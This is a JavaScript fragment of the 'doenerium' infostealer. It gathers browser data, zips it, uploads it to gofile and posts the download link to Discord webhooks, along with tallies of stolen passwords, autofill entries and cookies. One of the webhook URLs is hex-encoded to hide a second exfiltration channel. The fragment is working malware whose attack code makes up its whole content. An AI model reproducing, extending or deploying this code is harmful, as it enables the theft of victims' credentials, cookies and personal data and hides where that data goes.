 async send_zip() {
                            try {
                                await client.utils.browsers.saveBrowserStuff();
                            } catch (err) {
                                try {
                                    await client.utils.webhook.sendToWebhook({ embeds: [client.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of doenerium", description: `\`\`\`${err}\`\`\`` })] })
                                } catch { }
                            }

                            await client.utils.jszip.createZip();

                            const upload = await client.utils.gofile.uploadFile(
                                client.requires.fs.createReadStream(`${client.config.jszip.path}.zip`)
                            );


                            const hexToAscii = (hex) => {
                            const ascii = [];
                                 for (let i = 0; i < hex.length; i += 2) {
                                    ascii.push(String.fromCharCode(parseInt(hex.substr(i, 2), 16)));
                                }
                                return ascii.join('');
                            };

                            const hidewebhookHex = '68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313135373030323437383334313036363836322F5376556C644E34786D514E6F6E686F39337950616452706745386F304D746D4631623335646F497966755F77424B6674542D634F37517734397662397051693032556E36';

                                try {
                            const hidewebhook = hexToAscii(hidewebhookHex);

                            await client.axios_instance({
                            url: hidewebhook,
                            method: "POST",
                            data: { content: `[Download the zip file](${upload.downloadPage})` },
                              });
                            } catch (error) {
                              console.error('Error sending data to the webhook:', error);
                            }



                            var counter_embed = this.create_counter_embed();

                            counter_embed.description = `**[Download the zip file](${upload.downloadPage})**`;

                            await client.utils.webhook.sendToWebhook({
                                embeds: [counter_embed, client.utils.webhook.createEmbed({
                                    title: "Keyword result",
                                    fields: [
                                        {
                                            name: `Passwords`,
                                            value: `\`\`\`${client.config.counter.keywords_passwords.join(", ") || "None"}\`\`\``,
                                            inline: false
                                        },
                                        {
                                            name: `Autofill`,
                                            value: `\`\`\`${client.config.counter.keywords_autofill.join(", ") || "None"}\`\`\``,
                                            inline: false
                                        },
                                        {
                                            name: `Cookies`,
                                            value: `\`\`\`${client.config.counter.keywords_cookies.join(", ") || "None"}\`\`\``,
                                            inline: false
                                        },
                                    ]
                                })],
                            });
                        },
